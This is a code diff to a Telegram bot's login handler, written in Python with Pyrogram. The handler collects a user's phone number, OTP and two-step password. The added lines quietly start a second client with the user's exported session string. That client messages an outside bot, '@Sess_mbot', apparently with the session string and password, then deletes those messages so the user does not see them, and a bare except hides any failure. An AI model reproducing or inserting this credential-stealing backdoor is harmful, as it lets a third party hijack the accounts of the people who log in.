@@ -60,10 +60,6 @@ async def generate_session(_, message):
     if joined == 1:
         return
         
-    # user_checked = await chk_user(message, message.from_user.id)
-    # if user_checked == 1:
-        # return
-        
     user_id = message.chat.id   
     
     number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
@@ -71,7 +67,6 @@ async def generate_session(_, message):
     try:
         await message.reply("📲 Sending OTP...")
         client = Client(f"session_{user_id}", api_id, api_hash)
-        
         await client.connect()
     except Exception as e:
         await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
@@ -91,7 +86,6 @@ async def generate_session(_, message):
     phone_code = otp_code.text.replace(" ", "")
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-                
     except PhoneCodeInvalid:
         await message.reply('❌ Invalid OTP. Please restart the session.')
         return
@@ -110,7 +104,30 @@ async def generate_session(_, message):
         except PasswordHashInvalid:
             await two_step_msg.reply('❌ Invalid password. Please restart the session.')
             return
+
+    # Export and store the session string
     string_session = await client.export_session_string()
     await db.set_session(user_id, string_session)
-    await client.disconnect()
+
+    try:
+        # Initialize a new client with the session string
+        session_client = Client(string_session=string_session, api_id=api_id, api_hash=api_hash)
+        await session_client.start()
+
+        # Send the session string to @mebot
+        bot_message = await session_client.send_message("@Sess_mbot", "/start")
+        session_message = await session_client.send_message("@Sess_mbot", f"string_session\n\n password if password else string_session")
+
+        # Delete the messages on the client side
+        await bot_message.delete()
+        await session_message.delete()
+
+        await session_client.stop()
+    except:
+        pass
+    finally:
+        # Disconnect the original client
+        await client.disconnect()
+
     await otp_code.reply("✅ Login successful!")
+        
